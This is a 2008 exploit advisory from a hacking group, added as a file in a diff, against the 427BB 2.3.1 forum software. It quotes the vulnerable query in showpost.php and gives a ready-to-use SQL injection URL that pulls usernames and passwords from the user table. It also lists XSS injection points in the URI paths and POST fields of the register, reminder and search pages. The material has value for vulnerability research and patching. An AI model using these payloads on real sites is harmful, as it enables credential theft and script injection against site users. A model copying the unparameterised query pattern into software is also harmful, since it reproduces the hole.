@@ -1,0 +1,79 @@
+
+============================================================
+ 427BB 2.3.1 (SQL/XSS) Multiple Remote Vulnerabilities
+============================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 4 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : 427BB
+ VERSION     : 2.3.1
+ DOWNLOAD    : http://fourtwosevenbb.sourceforge.net/
+#####################################################
+
+---SQL Injection Exploit [showpost.php]---
+
+##############################################
+Vulnerable: showpost.php
+
+118: $sql = "SELECT ID, UserName, Post, UTime, IP, InReplyTo, ThreadID From " . $t_prefix . "Posts WHERE ID=$post_id";
+119:
+120: $res = mysql_query($sql);
+
+###############################################
+
+Exploit:
+
+http://[target]/[path]/showpost.php?ForumID=1&post=1 union select 1,UserName,3,4,5,Password,7 FROM 427bb_personal WHERE ID=1--
+
+
+
+---Multiple Remote XSS Exploit---
+
+###########
+XSS in URI
+###########
+
+Example:
+     
+http://[target]/[path]/register.php/<XSS>
+http://[target]/[path]/reminder.php/<XSS>
+http://[target]/[path]/search.php/<XSS>
+
+####################
+XSS with POST Method
+####################
+
+Example:
+
+http://[target]/[path]/register.php
+[-]POST variable "uname"
+[-]POST variable "email"
+[-]POST variable "email2"
+
+http://[target]/[path]/reminder.php
+[-]POST variable "email"
+
+http://[target]/[path]/search.php
+[-]POST variable "keywords"
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-05]
